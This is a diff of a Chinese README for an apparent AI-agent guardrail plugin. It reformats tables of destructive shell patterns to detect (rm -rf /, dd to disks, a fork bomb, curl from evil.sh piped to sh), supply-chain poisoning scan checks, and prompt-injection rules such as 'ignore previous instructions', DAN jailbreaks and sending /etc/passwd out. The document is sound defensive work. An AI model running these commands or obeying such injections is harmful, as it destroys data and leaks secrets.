@@ -14,23 +14,23 @@
 
 Server 端监听 `tools/pre-execute`，bash 命令匹配破坏性模式时记录 high 告警：
 
-| 模式 | 示例 |
-|------|------|
-| 删除根/家目录 | `rm -rf /`、`rm -fr /*`、`rm -rf ~`、`rm -rf $HOME` |
-| 格式化磁盘 | `mkfs.ext4 /dev/sdb1` |
-| 直接写块设备 | `dd if=/dev/zero of=/dev/sda`、`> /dev/sda` |
-| fork 炸弹 | `:(){ :|:& };:` |
-| 根目录全权限 | `chmod -R 777 /`、`chown -R` |
-| 关机/重启 | `shutdown`、`reboot`、`halt`、`poweroff` |
-| 下载执行 | `curl http://evil.sh \| sh`、`wget -qO- ... \| bash` |
+| 模式          | 示例                                                 |
+| ------------- | ---------------------------------------------------- |
+| 删除根/家目录 | `rm -rf /`、`rm -fr /*`、`rm -rf ~`、`rm -rf $HOME`  |
+| 格式化磁盘    | `mkfs.ext4 /dev/sdb1`                                |
+| 直接写块设备  | `dd if=/dev/zero of=/dev/sda`、`> /dev/sda`          |
+| fork 炸弹     | `:(){ :                                              | :& };:` |
+| 根目录全权限  | `chmod -R 777 /`、`chown -R`                         |
+| 关机/重启     | `shutdown`、`reboot`、`halt`、`poweroff`             |
+| 下载执行      | `curl http://evil.sh \| sh`、`wget -qO- ... \| bash` |
 
 三种护栏模式（插件配置 `mode`）：
 
-| 模式 | 行为 |
-|------|------|
-| `observe`（默认） | 只读观察：记录告警，工具照常执行（不改变工具/审批流程） |
-| `ask` | 返回 `{ kind: 'ask' }` 触发 DSH 原生审批流程，**用户确认后才执行** |
-| `deny` | 直接拦截（工具返回错误） |
+| 模式              | 行为                                                               |
+| ----------------- | ------------------------------------------------------------------ |
+| `observe`（默认） | 只读观察：记录告警，工具照常执行（不改变工具/审批流程）            |
+| `ask`             | 返回 `{ kind: 'ask' }` 触发 DSH 原生审批流程，**用户确认后才执行** |
+| `deny`            | 直接拦截（工具返回错误）                                           |
 
 ### 2. 安装前投毒扫描（可疑内容告警）
 
@@ -41,12 +41,12 @@ Server 端监听 `tools/pre-execute`，bash 命令匹配破坏性模式时记录
 
 扫描检测项：
 
-| 类别 | 检测内容 |
-|------|---------|
+| 类别     | 检测内容                                                                                                                                       |
+| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
 | 可疑脚本 | install/postinstall 脚本含下载执行、eval、base64 解码、chmod +x、curl POST、node -e / python -c、git clone、再装依赖、写 /etc / crontab / .ssh |
-| 密钥 | 私钥（RSA/EC/OpenSSH）、AWS Access Key、GitHub PAT、OpenAI Key、Slack Token、Google API Key、硬编码凭据 |
-| 恶意依赖 | 已知被投毒/恶意包名（flatmap-stream、event-stream 等 npm 投毒历史事件） |
-| 可疑文件 | .exe/.dll/.bin/.so/.jar 二进制、.sh/.bash 脚本、.bat/.cmd/.ps1 |
+| 密钥     | 私钥（RSA/EC/OpenSSH）、AWS Access Key、GitHub PAT、OpenAI Key、Slack Token、Google API Key、硬编码凭据                                        |
+| 恶意依赖 | 已知被投毒/恶意包名（flatmap-stream、event-stream 等 npm 投毒历史事件）                                                                        |
+| 可疑文件 | .exe/.dll/.bin/.so/.jar 二进制、.sh/.bash 脚本、.bat/.cmd/.ps1                                                                                 |
 
 发现可疑内容 → 记录 poison 告警（含文件 + 模式）。也可在侧边栏面板或 `POST /guard/api/scan` 手动扫描任意包名/路径。
 
@@ -54,15 +54,15 @@ Server 端监听 `tools/pre-execute`，bash 命令匹配破坏性模式时记录
 
 规则 + 启发式检测用户消息中的 prompt injection / jailbreak 尝试：
 
-| 规则 | 严重级别 | 检测内容 |
-|------|---------|---------|
-| `ignore-previous` | high | 忽略之前/以上所有指令（中英文） |
-| `system-override` | high | 系统提示词覆盖（你是系统/管理员/root） |
-| `jailbreak` | high | DAN / jailbreak / 越狱 / do anything now |
-| `role-escalation` | medium | 扮演/假装 + root/管理员/无限制 |
-| `secret-exfil` | high | 发送/上传密钥、密码、/etc/passwd 到外部 |
-| `encoding-obfuscation` | medium | base64/rot13/hex 解码执行指令 |
-| `disable-safety` | high | 关闭/禁用/绕过安全审查机制 |
+| 规则                   | 严重级别 | 检测内容                                 |
+| ---------------------- | -------- | ---------------------------------------- |
+| `ignore-previous`      | high     | 忽略之前/以上所有指令（中英文）          |
+| `system-override`      | high     | 系统提示词覆盖（你是系统/管理员/root）   |
+| `jailbreak`            | high     | DAN / jailbreak / 越狱 / do anything now |
+| `role-escalation`      | medium   | 扮演/假装 + root/管理员/无限制           |
+| `secret-exfil`         | high     | 发送/上传密钥、密码、/etc/passwd 到外部  |
+| `encoding-obfuscation` | medium   | base64/rot13/hex 解码执行指令            |
+| `disable-safety`       | high     | 关闭/禁用/绕过安全审查机制               |
 
 监听 `session/event` 的 `user/message`（过滤插件注入消息，避免误报）自动检测，命中 → 记录 injection 告警；也可在面板或 `POST /guard/api/scan-prompt` 手动检测。
 
@@ -98,18 +98,18 @@ dsh plugin --profile web add link:<仓库路径>/plugins/dsh-my-guard
 - insert:
     - id: guard
       name: 'dsh-my-guard'
-    - config:            # 传给 apply(ctx, config)
-        mode: 'observe'  # 护栏模式：observe（默认，只告警）/ ask（审批确认）/ deny（直接拦截）
+    - config: # 传给 apply(ctx, config)
+        mode: 'observe' # 护栏模式：observe（默认，只告警）/ ask（审批确认）/ deny（直接拦截）
         poisonScan: true # 投毒扫描自动联动（默认 true）
-        injection: true  # 提示注入检测（默认 true）
+        injection: true # 提示注入检测（默认 true）
 ```
 
 ## 依赖
 
-| 依赖 | 用途 | 可选 |
-|------|------|------|
-| `cordis` | 插件运行时 | 是（宿主提供） |
-| `react` | client 端组件 | 是（宿主提供） |
+| 依赖     | 用途          | 可选           |
+| -------- | ------------- | -------------- |
+| `cordis` | 插件运行时    | 是（宿主提供） |
+| `react`  | client 端组件 | 是（宿主提供） |
 
 ## 限制与说明
 
